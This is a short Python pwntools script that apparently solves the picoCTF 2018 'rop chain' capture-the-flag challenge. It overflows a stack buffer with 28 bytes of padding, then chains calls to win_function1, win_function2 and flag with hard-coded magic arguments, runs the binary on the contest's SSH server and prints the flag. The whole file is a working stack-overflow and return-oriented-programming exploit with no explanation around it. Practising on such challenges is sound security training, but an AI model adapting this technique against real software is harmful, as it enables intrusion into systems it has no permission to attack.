#!/usr/bin/env python3
from pwn import *
from getpass import getpass

e = ELF('rop')
flag_addr = e.symbols[b'flag']
win1_addr = e.symbols[b'win_function1']
win2_addr = e.symbols[b'win_function2']
JUNK = b'A' * 28

payload = JUNK + p32(win1_addr) + p32(win2_addr) + p32(flag_addr) + p32(0xbaaaaaad) + p32(0xDEADBAAD)

path = '/problems/rop-chain_3_f91334c5acb91bde3de858eb8045928a/'

s = ssh(host='2018shell4.picoctf.com', user=input('[+] SSH username: '), password=getpass('[+] SSH password: '))

r = s.run('cd %s && ./rop' % path)

r.recv()
r.sendline(payload)
log.info('Flag: ' + r.recvline().decode('utf-8'))
r.close()
s.close()
